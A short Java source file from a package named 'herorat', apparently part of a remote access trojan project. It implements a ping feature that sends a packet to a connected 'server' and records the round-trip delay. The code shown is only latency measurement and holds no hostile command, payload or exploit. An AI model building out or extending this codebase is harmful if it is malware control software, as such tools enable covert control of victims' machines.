package net.herorat.features.ping;

import net.herorat.features.servers.Server;
import net.herorat.network.Packet;
import net.herorat.network.Packet1Ping;


public class Ping
{
	private static long timestamp;
	
	public static void send(Server server)
	{
		timestamp = System.currentTimeMillis();
		Packet p = new Packet1Ping(server.outputstream, new String[] { });
		p.write();
	}
	
	public static void handle(Server server, String[] args)
	{
		long delay = System.currentTimeMillis() - timestamp;
		server.setPing(delay);
	}
}